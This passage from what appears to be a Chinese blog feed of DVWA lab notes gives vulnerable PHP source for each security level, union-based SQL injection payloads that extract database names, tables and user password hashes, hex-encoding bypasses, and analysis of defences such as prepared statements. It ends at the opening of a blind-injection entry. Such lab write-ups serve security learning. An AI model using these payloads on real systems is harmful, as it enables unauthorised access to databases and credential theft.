class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Reset bad login count</span></span><br><span class="line">        $data = $db-&gt;prepare( <span class="string">&#x27;UPDATE users SET failed_login = &quot;0&quot; WHERE user = (:user) LIMIT 1;&#x27;</span> );</span><br><span class="line">        $data-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, $user, <span class="attr">PDO</span>::PARAM_STR );</span><br><span class="line">        $data-&gt;execute();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        sleep( rand( <span class="number">2</span>, <span class="number">4</span> ) );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Give the user some feedback</span></span><br><span class="line">        echo <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;br /&gt;&lt;br/&gt;Alternative, the account has been locked because of too many failed logins.&lt;br /&gt;If this is the case, &lt;em&gt;please try again in &#123;$lockout_time&#125; minutes&lt;/em&gt;.&lt;/pre&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update bad login count</span></span><br><span class="line">        $data = $db-&gt;prepare( <span class="string">&#x27;UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;&#x27;</span> );</span><br><span class="line">        $data-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, $user, <span class="attr">PDO</span>::PARAM_STR );</span><br><span class="line">        $data-&gt;execute();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set the last login time</span></span><br><span class="line">    $data = $db-&gt;prepare( <span class="string">&#x27;UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;&#x27;</span> );</span><br><span class="line">    $data-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, $user, <span class="attr">PDO</span>::PARAM_STR );</span><br><span class="line">    $data-&gt;execute();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;源码使用Anti-CSRF token防止CSRF攻击，同时采用PDO（PHP Data Object）机制防御sql注入。<br>&emsp;&emsp;在数据库中针对每一个用户名添加了failed_login, last_login字段，记录用户错误登录次数和上一次登录时间，当错误次数大于3次时，锁定账户15分钟。当正确的用户登录时，提示该用户可能被爆破攻击，并显示错误次数和上次登录时间。</p>
<div align="center"><img src="/2021/06/21/DVWA-%E4%B8%80-%EF%BC%9ABrute-Force%EF%BC%88%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%EF%BC%89/High/10.png" width="500" height="301"></div>

<p><br></p>
<div align="center"><img src="/2021/06/21/DVWA-%E4%B8%80-%EF%BC%9ABrute-Force%EF%BC%88%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%EF%BC%89/High/11.png" width="300" height="297"></div>]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title>DVWA(七)：SQL-Injection（sql注入）</title>
    <url>/2021/06/28/DVWA-%E4%B8%83-%EF%BC%9ASQL-Injection%EF%BC%88sql%E6%B3%A8%E5%85%A5%EF%BC%89/</url>
    <content><![CDATA[<!-- excerpt --><br><!-- toc --></p>
<h1 id="SQL注入定义"><a href="#SQL注入定义" class="headerlink" title="SQL注入定义"></a>SQL注入定义</h1><p>&emsp;&emsp;SQL是操作数据库数据的结构化查询语言，网页的应用数据和后台数据库中的数据进行交互时会采用SQL。而SQL注入是将Web页面的原URL、表单域或数据包输入的参数，修改拼接成SQL语句，传递给Web服务器，进而传给数据库服务器以执行数据库命令。如Web应用程序的开发人员对用户所输入的数据或cookie等内容不进行过滤或验证(即存在注入点)就直接传输给数据库，就可能导致拼接的SQL被执行，获取对数据库的信息以及提权，发生SQL注入攻击。（来自百度百科）</p>
<h1 id="SQL注入流程"><a href="#SQL注入流程" class="headerlink" title="SQL注入流程"></a>SQL注入流程</h1><p>&emsp;&emsp;当我们在web页面中遇到用户输入框，或者url上显示了输入数据情况，怀疑存在sql注入，可以执行以下步骤：</p>
<ol>
<li>寻找注入点，确认是字符串注入还是数字注入</li>
<li>查询该表中字段数</li>
<li>查询各字段含义</li>
<li>找到当前数据库名称</li>
<li>找出数据库中的表名</li>
<li>找出表中字段名和字段值</li>
<li>写入webshell</li>
</ol>
<h1 id="安全级别Low"><a href="#安全级别Low" class="headerlink" title="安全级别Low"></a>安全级别Low</h1><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( isset( $_REQUEST[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">	<span class="comment">// Get input 获取输入的id</span></span><br><span class="line">	$id = $_REQUEST[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Check database 数据库查询语句</span></span><br><span class="line">	$query  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27;;&quot;</span>;</span><br><span class="line">	$result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $query ) or die( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Get results 获取查询结果</span></span><br><span class="line">	<span class="keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">		<span class="comment">// Get values</span></span><br><span class="line">		$first = $row[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">		$last  = $row[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Feedback for end user 显示结果</span></span><br><span class="line">		$html .= <span class="string">&quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;关键数据库查询语句如下，id传入是字符串型：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">SELECT first_name, last_name FROM users WHERE user_id = <span class="string">&#x27;$id&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;DVWA中注入位置如下，是数据库id查询框：</p>
<div align="center"><img src="/2021/06/28/DVWA-%E4%B8%83-%EF%BC%9ASQL-Injection%EF%BC%88sql%E6%B3%A8%E5%85%A5%EF%BC%89/Low/1.jpg" width="250" height="137"></div>

<p>&emsp;&emsp;其中$id就是用户的输入内容，可以看出，该代码并未对用户输入进行处理，而是直接拼接成sql语句执行，因此很容易注入。</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>&emsp;&emsp;输入框输入1，显示信息是该id的First name和Surname：</p>
<div align="center"><img src="/2021/06/28/DVWA-%E4%B8%83-%EF%BC%9ASQL-Injection%EF%BC%88sql%E6%B3%A8%E5%85%A5%EF%BC%89/Low/2.png" width="350" height="172"></div>

<p>&emsp;&emsp;输入框输入1’，测试是否有引号闭合：</p>
<div align="center"><img src="/2021/06/28/DVWA-%E4%B8%83-%EF%BC%9ASQL-Injection%EF%BC%88sql%E6%B3%A8%E5%85%A5%EF%BC%89/Low/3.png"></div>

<p>&emsp;&emsp;提示引号错误，因为多了一个单引号，查询语句变为：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">SELECT first_name, last_name FROM users WHERE user_id = <span class="string">&#x27;1&#x27;</span><span class="string">&#x27;;</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;说明输入是字符串型输入，要闭合单引号。这和我们看到的代码吻合，sql查询语句中使用‘id’，输入内容被当做字符串。<br>&emsp;&emsp;闭合单引号，输入框输入1’ and 1=1#，结果如下：</p>
<div align="center"><img src="/2021/06/28/DVWA-%E4%B8%83-%EF%BC%9ASQL-Injection%EF%BC%88sql%E6%B3%A8%E5%85%A5%EF%BC%89/Low/4.png" width="350" height="173"></div>

<p>&emsp;&emsp;该语句中1=1为永真条件，sql中#为注释符，因此原语句单引号被注释掉，不会发生错误，查询语句变为：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">SELECT first_name, last_name FROM users WHERE user_id = &#x27;1&#x27; and 1=1 #&#x27;;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;在mysql语句中使用order by进行查询的排序，order by后可以接字段名，也可以接字段号，如按照第一个字段排序就是order by 1。因此可以利用该特性找出表中的字段数，当order by 报错时，说明超出表中的字段数。输入1’ order by 2#，结果如下：</p>
<div align="center"><img src="/2021/06/28/DVWA-%E4%B8%83-%EF%BC%9ASQL-Injection%EF%BC%88sql%E6%B3%A8%E5%85%A5%EF%BC%89/Low/5.png" width="350" height="170"></div>

<p>&emsp;&emsp;当我们输入1’ order by 3# 时显示：</p>
<div align="center"><img src="/2021/06/28/DVWA-%E4%B8%83-%EF%BC%9ASQL-Injection%EF%BC%88sql%E6%B3%A8%E5%85%A5%EF%BC%89/Low/6.png"></div>

<p>&emsp;&emsp;说明该表中只有两个字段，即显示的First name和Surname。<br>&emsp;&emsp;在mysql中可以使用union联合查询多条信息，而select有一个特性，select直接加数字串时，可以不写后面的表名，那么它输出的内容就是我们select后的数字。我们利用该特性来注入，输入1’ union select 1,2#，结果如下：</p>
<div align="center"><img src="/2021/06/28/DVWA-%E4%B8%83-%EF%BC%9ASQL-Injection%EF%BC%88sql%E6%B3%A8%E5%85%A5%EF%BC%89/Low/7.png" width="350" height="227"></div>

<p>&emsp;&emsp;如果我们替换select后面的1和2为sql语句，那么就会先执行语句再显示。mysql中可以使用database()显示当前数据库名，使用version()显示版本信息。那么我们输入：<br>&emsp;&emsp;1’ union select version(),database()#<br>&emsp;&emsp;结果如下： </p>
<div align="center"><img src="/2021/06/28/DVWA-%E4%B8%83-%EF%BC%9ASQL-Injection%EF%BC%88sql%E6%B3%A8%E5%85%A5%EF%BC%89/Low/8.png" width="350" height="237"></div>

<p>&emsp;&emsp;以上都是一些比较基础和简单的信息，接下来我们需要爆出库中的表、表中的各项数据。首先需要知道mysql中有一个信息数据库 information_schema ，记录了该数据库的各种信息。<br>&emsp;&emsp;information_schema.schemata表，表中schema_name记录了数据库名称；information_schema.tables表，表中table_schema记录数据表所属的数据库名，table_name记录表名称；information_schema.columns表，表中table_name记录该列的表名，column_name 记录列名。利用这三个表可以获得数据库中的各种信息。<br>&emsp;&emsp;输入：<br>&emsp;&emsp;1’ union select 1,group_concat(schema_name) from information_schema.schemata#<br>&emsp;&emsp;获取数据库的名称：</p>
<div align="center"><img src="/2021/06/28/DVWA-%E4%B8%83-%EF%BC%9ASQL-Injection%EF%BC%88sql%E6%B3%A8%E5%85%A5%EF%BC%89/Low/9.png" width="600" height="243"></div>

<p>&emsp;&emsp;现在知道有一个名为dvwa的数据库，输入：<br>&emsp;&emsp;1’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=’dvwa’#<br>&emsp;&emsp;查找属于dvwa库的表名称：</p>
<div align="center"><img src="/2021/06/28/DVWA-%E4%B8%83-%EF%BC%9ASQL-Injection%EF%BC%88sql%E6%B3%A8%E5%85%A5%EF%BC%89/Low/10.png" width="600" height="197"></div>

<p>&emsp;&emsp;查询到dvwa数据库中有guestbook和users表，因此输入：<br>&emsp;&emsp;1’ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’#<br>&emsp;&emsp;查询users表中的字段名称：</p>
<div align="center"><img src="/2021/06/28/DVWA-%E4%B8%83-%EF%BC%9ASQL-Injection%EF%BC%88sql%E6%B3%A8%E5%85%A5%EF%BC%89/Low/11.png" width="600" height="195"></div>

<p>&emsp;&emsp;现在已经获取到关键字段名称，如first_name、last_name，就是正常显示的字段。其中有user、password两个字段，获取这两个字段信息，现在已经知道表名和字段名，直接查询即可，输入：<br>&emsp;&emsp;1’ union select user,password from users#<br>&emsp;&emsp;结果如下：</p>
<div align="center"><img src="/2021/06/28/DVWA-%E4%B8%83-%EF%BC%9ASQL-Injection%EF%BC%88sql%E6%B3%A8%E5%85%A5%EF%BC%89/Low/12.png" width="350" height="407"></div>

<h1 id="安全级别Medium"><a href="#安全级别Medium" class="headerlink" title="安全级别Medium"></a>安全级别Medium</h1><h2 id="源码分析-1"><a href="#源码分析-1" class="headerlink" title="源码分析"></a>源码分析</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( isset( $_POST[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_POST[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line">    <span class="comment">//mysqli_real_escape_string将x00，\n，\r，\，&#x27;，&quot;，x1a这些特殊字符转义，防SQL注入</span></span><br><span class="line">    $id = mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>], $id);</span><br><span class="line"></span><br><span class="line">    $query  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>], $query) or die( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">        <span class="comment">// Display values</span></span><br><span class="line">        $first = $row[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">        $last  = $row[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        echo <span class="string">&quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// This is used later on in the index.php page</span></span><br><span class="line"><span class="comment">// Setting it here so we can close the database connection in here like in the rest of the source scripts</span></span><br><span class="line">$query  = <span class="string">&quot;SELECT COUNT(*) FROM users;&quot;</span>;</span><br><span class="line">$result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $query ) or die( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line">$number_of_rows = mysqli_fetch_row( $result )[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;代码和初级有所不同，在获取id传入数据后，调用mysqli_real_escape_string函数将x00，\n，\r，\，’，”，x1a这些特殊字符转义，防SQL注入。同时查询语句中id直接作为数字传入，没有单引号。<br>&emsp;&emsp;DVWA中中级显示如下，这次连输入框都没有了，通过下拉列表来实现id传入。</p>
<div align="center"><img src="/2021/06/28/DVWA-%E4%B8%83-%EF%BC%9ASQL-Injection%EF%BC%88sql%E6%B3%A8%E5%85%A5%EF%BC%89/Middle/1.png" width="350" height="130"></div>

<h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>&emsp;&emsp;在下拉列表中选择1，并点击Submit提交，获取到如下信息：</p>
<div align="center"><img src="/2021/06/28/DVWA-%E4%B8%83-%EF%BC%9ASQL-Injection%EF%BC%88sql%E6%B3%A8%E5%85%A5%EF%BC%89/Middle/2.png" width="350" height="171"></div>

<p>&emsp;&emsp;此时我们的url也没有发生变化，因此找不到注入点。我们通过burpsuit抓包看看：</p>
<div align="center"><img src="/2021/06/28/DVWA-%E4%B8%83-%EF%BC%9ASQL-Injection%EF%BC%88sql%E6%B3%A8%E5%85%A5%EF%BC%89/Middle/3.png" width="600" height="321"></div>

<p>&emsp;&emsp;发现Submit是通过POST方法提交的，post传入的数据为id=1&amp;Submit=Submit。因此我们可以更改post传入的id值来进行注入，使用hackbar插件，直接填充post的数据：<br>&emsp;&emsp;Submit=Submit&amp;id=1 union select 1,2</p>
<div align="center"><img src="/2021/06/28/DVWA-%E4%B8%83-%EF%BC%9ASQL-Injection%EF%BC%88sql%E6%B3%A8%E5%85%A5%EF%BC%89/Middle/4.png" width="600" height="172"></div>

<p><br></p>
<div align="center"><img src="/2021/06/28/DVWA-%E4%B8%83-%EF%BC%9ASQL-Injection%EF%BC%88sql%E6%B3%A8%E5%85%A5%EF%BC%89/Middle/5.png" width="350" height="223"></div>

<p>&emsp;&emsp;剩余步骤和级别low相同，一步步找出数据库名、表名、列名，最后获得用户和密码。需要注意的是单引号等特殊字符被转义，因此不能使用，当我们需要使用’dvwa’或者’users’时，可以使用16进制来绕过：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">1 union select 1,group_concat(schema_name) from information_schema.schemata#</span><br><span class="line">1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=0x64767761#      0x64767761是dvwa的16进制</span><br><span class="line">1 union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273#   0x7573657273是users的16进制</span><br><span class="line">1 union select user,password from users#</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;最后结果如下：</p>
<div align="center"><img src="/2021/06/28/DVWA-%E4%B8%83-%EF%BC%9ASQL-Injection%EF%BC%88sql%E6%B3%A8%E5%85%A5%EF%BC%89/Middle/6.png" width="600" height="175"></div>

<p><br></p>
<div align="center"><img src="/2021/06/28/DVWA-%E4%B8%83-%EF%BC%9ASQL-Injection%EF%BC%88sql%E6%B3%A8%E5%85%A5%EF%BC%89/Middle/7.png" width="350" height="412"></div>

<h1 id="安全级别High"><a href="#安全级别High" class="headerlink" title="安全级别High"></a>安全级别High</h1><h2 id="源码分析-2"><a href="#源码分析-2" class="headerlink" title="源码分析"></a>源码分析</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( isset( $_SESSION [ <span class="string">&#x27;id&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_SESSION[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $query  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27; LIMIT 1;&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>], $query ) or die( <span class="string">&#x27;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">        <span class="comment">// Get values</span></span><br><span class="line">        $first = $row[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">        $last  = $row[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        echo <span class="string">&quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : $___mysqli_res);        </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;DVWA中高级显示如下，点击”here to change your ID”，页面自动跳转，防御了自动化的SQL注入。分析源码可可知，对参数没有做防御，和级别low类似。</p>
<div align="center"><img src="/2021/06/28/DVWA-%E4%B8%83-%EF%BC%9ASQL-Injection%EF%BC%88sql%E6%B3%A8%E5%85%A5%EF%BC%89/High/1.png" width="350" height="95"></div>

<p>&emsp;&emsp;点击链接后：</p>
<div align="center"><img src="/2021/06/28/DVWA-%E4%B8%83-%EF%BC%9ASQL-Injection%EF%BC%88sql%E6%B3%A8%E5%85%A5%EF%BC%89/High/2.png" width="300" height="143"></div>

<h2 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>&emsp;&emsp;在输入框中输入1’ union select 1,2#，可以直接执行，结果如下：</p>
<div align="center"><img src="/2021/06/28/DVWA-%E4%B8%83-%EF%BC%9ASQL-Injection%EF%BC%88sql%E6%B3%A8%E5%85%A5%EF%BC%89/High/3.png" width="350" height="217"></div>

<p>&emsp;&emsp;因此使用和low一样的步骤，可以依次得到数据库、表、列等数据，这里不再演示。</p>
<h1 id="安全级别Impossible"><a href="#安全级别Impossible" class="headerlink" title="安全级别Impossible"></a>安全级别Impossible</h1><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( isset( $_GET[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">&#x27;user_token&#x27;</span> ], $_SESSION[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_GET[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Was a number entered?</span></span><br><span class="line">    <span class="keyword">if</span>(is_numeric( $id )) &#123;</span><br><span class="line">        <span class="comment">// Check the database</span></span><br><span class="line">        $data = $db-&gt;prepare( <span class="string">&#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27;</span> );</span><br><span class="line">        $data-&gt;bindParam( <span class="string">&#x27;:id&#x27;</span>, $id, <span class="attr">PDO</span>::PARAM_INT );</span><br><span class="line">        $data-&gt;execute();</span><br><span class="line">        $row = $data-&gt;fetch();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Make sure only 1 result is returned</span></span><br><span class="line">        <span class="keyword">if</span>( $data-&gt;rowCount() == <span class="number">1</span> ) &#123;</span><br><span class="line">            <span class="comment">// Get values</span></span><br><span class="line">            $first = $row[ <span class="string">&#x27;first_name&#x27;</span> ];</span><br><span class="line">            $last  = $row[ <span class="string">&#x27;last_name&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for end user</span></span><br><span class="line">            echo <span class="string">&quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;impossible中使用了两处安全防护措施：</p>
<ol>
<li>Anti-CSRF token</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">checkToken( $_REQUEST[ <span class="string">&#x27;user_token&#x27;</span> ], $_SESSION[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;使用token验证用户，防止CSRF攻击</p>
<ol>
<li>数字检查</li>
</ol>
<p>&emsp;&emsp;使用is_numeric( $id )判断输入的id是数字还是字符串，只有输入为数字才执行sql查询。</p>
<ol>
<li>sql预处理</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$data = $db-&gt;prepare( <span class="string">&#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27;</span> );</span><br><span class="line">$data-&gt;bindParam( <span class="string">&#x27;:id&#x27;</span>, $id, <span class="attr">PDO</span>::PARAM_INT );</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;预处理和PDO会将传入的id值当做一个整体来处理，在运行时才替换参数，因此就算id中使用了引号或者sql语句，执行时会将其当做一整个字符串，不会有拼接动作，也就不能sql注入。<br>&emsp;&emsp;同时最后使用了$data-&gt;rowCount() == 1，限制查询结果为一条时才输出，有效防止信息泄露。</p>]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>DVWA</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>DVWA(八)：SQL-Injection（Blind盲注）</title>
    <url>/2021/06/28/DVWA-%E5%85%AB-%EF%BC%9ASQL-Injection%EF%BC%88Blind%E7%9B%B2%E6%B3%A8%EF%BC%89/</url>
    <content><![CDATA[<!-- excerpt --><br><!-- toc --></p>
<p>&emsp;&emsp;普通sql注入会显示出成功信息或者sql错误信息，攻击者可以根据回显来窃取数据库信息。而一般情况网站管理员不将数据库错误信息直接返回，而是返回自己设定的信息或者不显示，因此攻击者无法确定注入的sql语句是否正确，也无法得到库名、表名等。<br>&emsp;&emsp;根据页面不同的响应方式，SQL盲注分为：基于布尔的盲注、基于时间的盲注、基于报错的盲注。<br>&emsp;&emsp;<strong>基于布尔的盲注：</strong><br>&emsp;&emsp;通过构造判断条件，如数据库中库名、表名长度是否相等、字段名是否相同、字段名某个字符是否相等，根据服务器返回的结果（成功或失败），不断调整判断条件中的数值直到命中。此类注入需要服务器回显部分信息，如语句执行成功还是失败等。<br>&emsp;&emsp;<strong>基于时间的盲注：</strong><br>&emsp;&emsp;通过构造判断条件，使用sleep()函数，当判断为true时sleep一段时间，false时不执行。通过服务器的响应时间判断语句是否命中。此类注入不需要服务器回显信息，只需要响应时间即可。<br>&emsp;&emsp;<strong>基于错误的盲注：</strong><br>&emsp;&emsp;依赖于几个报错函数，如floor和count、group by冲突报错，UpdateXml()函数、ExtracValue()函数等，执行错误返回数据库信息。</p>
<h1 id="安全级别Low"><a href="#安全级别Low" class="headerlink" title="安全级别Low"></a>安全级别Low</h1><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( isset( $_GET[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_GET[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $getid  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27;;&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $getid ); <span class="comment">// Removed &#x27;or die&#x27; to suppress mysql errors</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    $num = @mysqli_num_rows( $result ); <span class="comment">// The &#x27;@&#x27; character suppresses errors</span></span><br><span class="line">    <span class="keyword">if</span>( $num &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        echo <span class="string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// User wasn&#x27;t found, so the page wasn&#x27;t!</span></span><br><span class="line">        header( $_SERVER[ <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span> ] . <span class="string">&#x27; 404 Not Found&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        echo <span class="string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? 